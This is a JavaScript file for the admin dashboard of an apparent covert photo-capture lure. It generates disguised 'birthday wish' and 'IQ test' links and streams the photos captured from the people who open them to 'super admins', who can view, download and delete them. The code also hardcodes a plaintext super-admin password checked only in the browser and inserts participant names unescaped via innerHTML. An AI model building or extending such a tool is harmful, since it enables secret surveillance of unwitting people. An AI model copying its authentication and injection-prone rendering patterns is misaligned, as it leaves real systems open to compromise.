// Admin Authentication System
const SUPER_ADMIN_PASSWORD = 'Hunter@05';
let currentAdminType = null;
let sessionToken = null;

// DOM Elements - Login
const loginScreen = document.getElementById('loginScreen');
const mainDashboard = document.getElementById('mainDashboard');
const loginForm = document.getElementById('loginForm');
const passwordField = document.getElementById('passwordField');
const adminPassword = document.getElementById('adminPassword');
const loginBtn = document.getElementById('loginBtn');
const errorMessage = document.getElementById('errorMessage');
const adminBadge = document.getElementById('adminBadge');

// DOM Elements - Dashboard
const statusEl = document.getElementById('status');
const feed = document.getElementById('feed');
const generateLinkBtn = document.getElementById('generateLinkBtn');
const sessionNameInput = document.getElementById('sessionName');
const linkDisplay = document.getElementById('linkDisplay');
const generatedLink = document.getElementById('generatedLink');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const activeSessionsCount = document.getElementById('activeSessionsCount');
const totalImagesCount = document.getElementById('totalImagesCount');
const connectedUsersCount = document.getElementById('connectedUsersCount');

// IQ Test elements
const generateIQTestBtn = document.getElementById('generateIQTestBtn');
const iqTestNameInput = document.getElementById('iqTestName');
const iqLinkDisplay = document.getElementById('iqLinkDisplay');
const generatedIQLink = document.getElementById('generatedIQLink');
const copyIQLinkBtn = document.getElementById('copyIQLinkBtn');
const iqSessionsList = document.getElementById('iqSessionsList');
const iqPhotoFeed = document.getElementById('iqPhotoFeed');

let ws = null;
let totalImages = 0;
let activeSessions = new Set();
let connectedUsers = 0;
let iqSessions = new Map(); // Store IQ test sessions

// Authentication Functions
function selectAdminType(type) {
  // Clear previous selections
  document.querySelectorAll('.admin-type-option').forEach(option => {
    option.classList.remove('selected');
  });
  
  // Select current option
  event.target.closest('.admin-type-option').classList.add('selected');
  document.getElementById(type + 'Admin').checked = true;
  
  // Show/hide password field
  if (type === 'super') {
    passwordField.classList.add('visible');
    loginBtn.disabled = false;
  } else {
    passwordField.classList.remove('visible');
    loginBtn.disabled = false;
  }
  
  errorMessage.textContent = '';
}

function login(adminType, password = null) {
  if (adminType === 'super') {
    if (password !== SUPER_ADMIN_PASSWORD) {
      errorMessage.textContent = 'Invalid super admin password';
      return false;
    }
  }
  
  currentAdminType = adminType;
  sessionToken = generateSessionToken();
  
  // Update UI
  loginScreen.style.display = 'none';
  mainDashboard.style.display = 'block';
  
  // Update admin badge
  if (adminType === 'super') {
    adminBadge.textContent = '👑 Super Admin';
    adminBadge.className = 'admin-badge super';
  } else {
    adminBadge.textContent = '👤 Normal Admin';
    adminBadge.className = 'admin-badge normal';
  }
  
  // Initialize dashboard
  connectWebSocket();
  updateAdminPrivileges();
  
  return true;
}

function logout() {
  currentAdminType = null;
  sessionToken = null;
  
  // Reset UI
  mainDashboard.style.display = 'none';
  loginScreen.style.display = 'flex';
  
  // Reset form
  loginForm.reset();
  document.querySelectorAll('.admin-type-option').forEach(option => {
    option.classList.remove('selected');
  });
  passwordField.classList.remove('visible');
  loginBtn.disabled = true;
  errorMessage.textContent = '';
  
  // Close WebSocket
  if (ws) {
    ws.close();
  }
}

function generateSessionToken() {
  return 'admin_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Login form handler
loginForm.addEventListener('submit', (e) => {
  e.preventDefault();
  
  const selectedType = document.querySelector('input[name="adminType"]:checked');
  if (!selectedType) {
    errorMessage.textContent = 'Please select an admin type';
    return;
  }
  
  const adminType = selectedType.value;
  const password = adminPassword.value;
  
  login(adminType, password);
});

// Initialize login screen
document.addEventListener('DOMContentLoaded', () => {
  // Show login screen initially
  loginScreen.style.display = 'flex';
  mainDashboard.style.display = 'none';
});

function connectWebSocket() {
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
  
  ws.addEventListener('open', () => {
    statusEl.textContent = 'Connected to server';
    statusEl.className = 'status connected';
    
    // Register with admin type and session token
    ws.send(JSON.stringify({ 
      type: 'register', 
      role: 'admin',
      adminType: currentAdminType,
      sessionToken: sessionToken
    }));
  });

  ws.addEventListener('message', (ev) => {
    try {
      const data = JSON.parse(ev.data);
      
      // Filter messages based on admin type
      if (currentAdminType === 'normal' && data.restrictToSuper) {
        return; // Normal admins can't see super admin only data
      }
      
      if (data.type === 'image') {
        // Only super admin receives actual image data
        if (currentAdminType === 'super') {
          handleNewImage(data);
        }
      } else if (data.type === 'session_image_count_update') {
        // Normal admin receives only count updates for birthday images
        console.log('Birthday session image count update:', data);
        // Update stats without showing images
        updateStatsDisplay();
      } else if (data.type === 'stats') {
        updateStats(data);
      } else if (data.type === 'user_connected') {
        connectedUsers++;
        updateStatsDisplay();
      } else if (data.type === 'user_disconnected') {
        connectedUsers = Math.max(0, connectedUsers - 1);
        updateStatsDisplay();
      } else if (data.type === 'iq_session_created') {
        console.log('IQ session created:', data);
        handleIQSessionCreated(data);
      } else if (data.type === 'iq_photo_captured') {
        // Only super admin receives actual photo data
        if (currentAdminType === 'super') {
          console.log('IQ photo captured:', data);
          handleIQPhotoCapture(data);
        }
      } else if (data.type === 'iq_session_photo_count_update') {
        // Normal admin receives only count updates for IQ photos
        if (currentAdminType !== 'super' && iqSessions.has(data.sessionId)) {
          iqSessions.get(data.sessionId).photoCount = data.photoCount;
          updateIQSessionsList();
          console.log('IQ session photo count updated:', data);
        }
      } else if (data.type === 'iq_test_completed') {
        console.log('IQ test completed:', data);
        handleIQTestCompleted(data);
      } else if (data.type === 'iq_session_active') {
        console.log('IQ session active:', data);
        // Handle active session notification
        if (!iqSessions.has(data.sessionId)) {
          iqSessions.set(data.sessionId, {
            id: data.sessionId,
            participantName: data.participantName,
            status: data.status,
            created: Date.now(),
            photoCount: 0
          });
          updateIQSessionsList();
        }
      } else if (data.type === 'all_sessions_data') {
        // Super admin receives all sessions data
        if (currentAdminType === 'super') {
          handleAllSessionsData(data);
        }
      } else if (data.type === 'image_deleted') {
        // Handle successful image deletion
        console.log('Image deleted successfully:', data);
        // Remove the image from UI for all admins
        const imageCards = document.querySelectorAll('.image-card');
        imageCards.forEach(card => {
          if (card.dataset.sessionId === data.sessionId && 
              card.dataset.imageTime == data.imageTime) {
            card.remove();
            totalImages = Math.max(0, totalImages - 1);
            updateStatsDisplay();
          }
        });
      } else if (data.type === 'iq_photo_deleted') {
        // Handle successful IQ photo deletion
        console.log('IQ photo deleted successfully:', data);
        // Remove the photo from UI for all admins
        const photoCards = document.querySelectorAll('.iq-photo-card');
        photoCards.forEach(card => {
          if (card.dataset.sessionId === data.sessionId && 
              card.dataset.photoTimestamp == data.timestamp) {
            card.remove();
            
            // Update session photo count
            if (iqSessions.has(data.sessionId)) {
              iqSessions.get(data.sessionId).photoCount = Math.max(0, iqSessions.get(data.sessionId).photoCount - 1);
              updateIQSessionsList();
            }
          }
        });
      } else if (data.type === 'delete_error') {
        // Handle deletion error
        alert(`Error deleting image: ${data.message}`);
        // Optionally refresh the page or reload data
        location.reload();
      }
    } catch (e) {
      console.error('Failed to parse message:', e);
    }
  });

  ws.addEventListener('close', () => {
    statusEl.textContent = 'Disconnected from server';
    statusEl.className = 'status disconnected';
    setTimeout(connectWebSocket, 3000);
  });

  ws.addEventListener('error', () => {
    statusEl.textContent = 'Connection error';
    statusEl.className = 'status disconnected';
  });
}

function handleNewImage(data) {
  const imageCard = document.createElement('div');
  imageCard.className = 'image-card';
  imageCard.dataset.sessionId = data.sessionId;
  imageCard.dataset.imageTime = data.time;
  
  const img = document.createElement('img');
  img.src = data.payload;
  img.alt = 'User capture';
  
  const meta = document.createElement('div');
  meta.className = 'image-meta';
  
  const userDiv = document.createElement('div');
  userDiv.className = 'user';
  userDiv.textContent = `Session: ${data.sessionId || 'Unknown'}`;
  
  const timeDiv = document.createElement('div');
  timeDiv.className = 'time';
  timeDiv.textContent = new Date(data.time).toLocaleString();
  
  const actionsDiv = document.createElement('div');
  actionsDiv.className = 'image-actions';
  
  const downloadBtn = document.createElement('button');
  downloadBtn.className = 'btn btn-secondary btn-small';
  downloadBtn.textContent = 'Download';
  downloadBtn.addEventListener('click', () => {
    const a = document.createElement('a');
    a.href = data.payload;
    a.download = `${data.sessionId || 'session'}-${Date.now()}.png`;
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
  
  actionsDiv.appendChild(downloadBtn);
  
  // Add delete button for super admin only
  if (currentAdminType === 'super') {
    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = 'Delete';
    deleteBtn.addEventListener('click', () => {
      if (confirm('Are you sure you want to delete this image? This action cannot be undone.')) {
        deleteImage(data.sessionId, data.time, 'birthday', imageCard);
      }
    });
    actionsDiv.appendChild(deleteBtn);
  }
  
  meta.appendChild(userDiv);
  meta.appendChild(timeDiv);
  meta.appendChild(actionsDiv);
  
  imageCard.appendChild(img);
  imageCard.appendChild(meta);
  
  feed.prepend(imageCard);
  
  // Update stats
  totalImages++;
  if (data.sessionId) {
    activeSessions.add(data.sessionId);
  }
  updateStatsDisplay();
}

function updateStats(data) {
  if (data.totalImages !== undefined) totalImages = data.totalImages;
  if (data.activeSessions !== undefined) activeSessions = new Set(data.activeSessions);
  if (data.connectedUsers !== undefined) connectedUsers = data.connectedUsers;
  updateStatsDisplay();
}

function updateStatsDisplay() {
  activeSessionsCount.textContent = activeSessions.size;
  totalImagesCount.textContent = totalImages;
  connectedUsersCount.textContent = connectedUsers;
}

function generateSessionId() {
  // Generate a short, professional 6-character code (like BW4K9P)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

generateLinkBtn.addEventListener('click', () => {
  const sessionName = sessionNameInput.value.trim() || 'Birthday Celebration';
  const sessionId = generateSessionId();
  const baseUrl = location.protocol + '//' + location.host;
  const link = `${baseUrl}/wish/${sessionId}`;
  
  generatedLink.textContent = link;
  linkDisplay.style.display = 'block';
  
  // Clear the session name input for next use
  sessionNameInput.value = '';
  
  // Send session creation to server
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'create_session',
      sessionId: sessionId,
      sessionName: sessionName
    }));
  }
});

copyLinkBtn.addEventListener('click', async () => {
  try {
    await navigator.clipboard.writeText(generatedLink.textContent);
    copyLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyLinkBtn.textContent = 'Copy Link';
    }, 2000);
  } catch (err) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = generatedLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    copyLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyLinkBtn.textContent = 'Copy Link';
    }, 2000);
  }
});

// IQ Test Link Generation
generateIQTestBtn.addEventListener('click', () => {
  const testName = iqTestNameInput.value.trim() || 'IQ Test Participant';
  const sessionId = generateSessionId();
  const baseUrl = location.protocol + '//' + location.host;
  const link = `${baseUrl}/iqtest/${sessionId}`;
  
  generatedIQLink.textContent = link;
  iqLinkDisplay.style.display = 'block';
  
  // Clear the test name input for next use
  iqTestNameInput.value = '';
  
  // Send IQ test session creation to server
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'create_iq_session',
      sessionId: sessionId,
      participantName: testName
    }));
  }
});

copyIQLinkBtn.addEventListener('click', async () => {
  try {
    await navigator.clipboard.writeText(generatedIQLink.textContent);
    copyIQLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyIQLinkBtn.textContent = 'Copy IQ Link';
    }, 2000);
  } catch (err) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = generatedIQLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    copyIQLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyIQLinkBtn.textContent = 'Copy IQ Link';
    }, 2000);
  }
});

// IQ Test Handlers
function handleIQSessionCreated(data) {
  iqSessions.set(data.sessionId, {
    id: data.sessionId,
    participantName: data.participantName,
    status: 'active',
    created: Date.now(),
    photoCount: 0
  });
  updateIQSessionsList();
}

function handleIQPhotoCapture(data) {
  console.log('Handling IQ photo capture:', {
    sessionId: data.sessionId,
    photoType: data.photoType,
    hasPhoto: !!data.photo,
    iqSessionsSize: iqSessions.size,
    iqPhotoFeedExists: !!iqPhotoFeed
  });
  
  // Update session photo count
  if (iqSessions.has(data.sessionId)) {
    iqSessions.get(data.sessionId).photoCount++;
    updateIQSessionsList();
    console.log('Updated session photo count');
  } else {
    console.log('Session not found in iqSessions:', data.sessionId);
    console.log('Available sessions:', Array.from(iqSessions.keys()));
  }
  
  // Add photo to feed
  const photoElement = createIQPhotoElement(data);
  console.log('Created photo element:', photoElement);
  
  if (iqPhotoFeed) {
    iqPhotoFeed.insertBefore(photoElement, iqPhotoFeed.firstChild);
    console.log('Photo added to feed, total photos now:', iqPhotoFeed.children.length);
    
    // Limit to 50 photos in feed
    while (iqPhotoFeed.children.length > 50) {
      iqPhotoFeed.removeChild(iqPhotoFeed.lastChild);
    }
  } else {
    console.error('iqPhotoFeed element not found!');
  }
}

function handleIQTestCompleted(data) {
  if (iqSessions.has(data.sessionId)) {
    const session = iqSessions.get(data.sessionId);
    session.status = 'completed';
    session.score = data.score;
    session.correctAnswers = data.correctAnswers;
    session.totalQuestions = data.totalQuestions;
    session.completedAt = Date.now();
    updateIQSessionsList();
  }
}

function updateIQSessionsList() {
  if (iqSessions.size === 0) {
    iqSessionsList.innerHTML = '<p style="color: #718096; text-align: center; padding: 2rem;">No active IQ test sessions</p>';
    return;
  }
  
  const sessionsArray = Array.from(iqSessions.values());
  iqSessionsList.innerHTML = sessionsArray.map(session => createIQSessionCard(session)).join('');
}

function createIQSessionCard(session) {
  const timeAgo = formatTimeAgo(session.created);
  const statusClass = session.status === 'completed' ? 'completed' : 'active';
  const scoreInfo = session.status === 'completed' 
    ? `<div class="info-item"><span>📊</span><span>Score: ${session.score} (${session.correctAnswers}/${session.totalQuestions})</span></div>`
    : '';
  
  return `
    <div class="iq-session-card">
      <div class="iq-session-header">
        <div class="iq-session-name">🧠 ${session.participantName}</div>
        <div class="iq-session-status ${statusClass}">${session.status}</div>
      </div>
      <div class="iq-session-info">
        <div class="info-item"><span>🆔</span><span>${session.id.substring(0, 8)}...</span></div>
        <div class="info-item"><span>⏰</span><span>${timeAgo}</span></div>
        <div class="info-item"><span>📸</span><span>${session.photoCount} photos</span></div>
        ${scoreInfo}
      </div>
    </div>
  `;
}

function createIQPhotoElement(data) {
  const div = document.createElement('div');
  div.className = 'iq-photo-card';
  div.dataset.sessionId = data.sessionId;
  div.dataset.photoTimestamp = data.timestamp;
  
  const session = iqSessions.get(data.sessionId);
  const participantName = session ? session.participantName : 'Unknown';
  const questionInfo = data.currentQuestion !== undefined 
    ? `Question ${data.currentQuestion + 1}` 
    : 'Setup';
  
  let deleteButtonHtml = '';
  if (currentAdminType === 'super') {
    deleteButtonHtml = `
      <button class="delete-btn" onclick="deleteIQPhoto('${data.sessionId}', ${data.timestamp}, this.closest('.iq-photo-card'))">
        Delete
      </button>
    `;
  }
  
  div.innerHTML = `
    <img src="${data.photo}" alt="IQ Test Capture" style="width: 100%; height: 200px; object-fit: cover;">
    <div class="iq-photo-meta">
      <div class="participant">${participantName}</div>
      <div class="photo-type">${data.photoType}</div>
      <div class="time">${formatTime(data.timestamp)}</div>
      <div class="question-info">${questionInfo}</div>
      ${deleteButtonHtml}
    </div>
  `;
  
  return div;
}

// Utility functions
function formatTimeAgo(timestamp) {
  const now = Date.now();
  const diff = now - timestamp;
  const minutes = Math.floor(diff / 60000);
  const hours = Math.floor(diff / 3600000);
  const days = Math.floor(diff / 86400000);
  
  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;
  return 'Just now';
}

function formatTime(timestamp) {
  return new Date(timestamp).toLocaleTimeString();
}

function handleAllSessionsData(data) {
  // Handle all sessions data for super admin
  if (data.allImages) {
    // Update feed with all images from all sessions
    feed.innerHTML = '';
    data.allImages.forEach(imageData => {
      handleNewImage(imageData);
    });
  }
  
  if (data.allIQSessions) {
    // Update IQ sessions with all sessions
    iqSessions.clear();
    data.allIQSessions.forEach(session => {
      iqSessions.set(session.id, session);
    });
    updateIQSessionsList();
  }
  
  if (data.allIQPhotos) {
    // Update IQ photos with all photos
    iqPhotoFeed.innerHTML = '';
    data.allIQPhotos.forEach(photoData => {
      const photoElement = createIQPhotoElement(photoData);
      iqPhotoFeed.appendChild(photoElement);
    });
  }
  
  // Update UI based on admin privileges
  updateAdminPrivileges();
}

function updateAdminPrivileges() {
  // Show/hide super admin only features
  const superAdminElements = document.querySelectorAll('.super-admin-only');
  const normalAdminInfoElements = document.querySelectorAll('.normal-admin-info');
  
  if (currentAdminType === 'super') {
    superAdminElements.forEach(element => {
      element.classList.add('visible');
      element.style.display = 'block';
    });
    normalAdminInfoElements.forEach(element => {
      element.style.display = 'none';
    });
  } else {
    superAdminElements.forEach(element => {
      element.classList.remove('visible');
      element.style.display = 'none';
    });
    normalAdminInfoElements.forEach(element => {
      element.style.display = 'block';
    });
  }
}

// Note: connectWebSocket() is called from login() function

// Delete functionality for super admin
function deleteImage(sessionId, imageTime, imageType, imageElement) {
  if (currentAdminType !== 'super') {
    alert('Only super admin can delete images');
    return;
  }
  
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    alert('Connection to server lost. Please refresh the page.');
    return;
  }
  
  // Send delete request to server
  ws.send(JSON.stringify({
    type: 'delete_image',
    sessionId: sessionId,
    imageTime: imageTime,
    imageType: imageType,
    adminType: currentAdminType
  }));
  
  // Remove from UI immediately (optimistic update)
  if (imageElement && imageElement.parentNode) {
    imageElement.remove();
    totalImages = Math.max(0, totalImages - 1);
    updateStatsDisplay();
  }
}

function deleteIQPhoto(sessionId, timestamp, photoElement) {
  if (currentAdminType !== 'super') {
    alert('Only super admin can delete images');
    return;
  }
  
  if (!confirm('Are you sure you want to delete this IQ test photo? This action cannot be undone.')) {
    return;
  }
  
  if (!ws || ws.readyState !== WebSocket.OPEN) {
    alert('Connection to server lost. Please refresh the page.');
    return;
  }
  
  // Send delete request to server
  ws.send(JSON.stringify({
    type: 'delete_iq_photo',
    sessionId: sessionId,
    timestamp: timestamp,
    adminType: currentAdminType
  }));
  
  // Remove from UI immediately (optimistic update)
  if (photoElement && photoElement.parentNode) {
    photoElement.remove();
    
    // Update session photo count
    if (iqSessions.has(sessionId)) {
      iqSessions.get(sessionId).photoCount = Math.max(0, iqSessions.get(sessionId).photoCount - 1);
      updateIQSessionsList();
    }
  }
}

// Make deleteIQPhoto globally available
window.deleteIQPhoto = deleteIQPhoto;
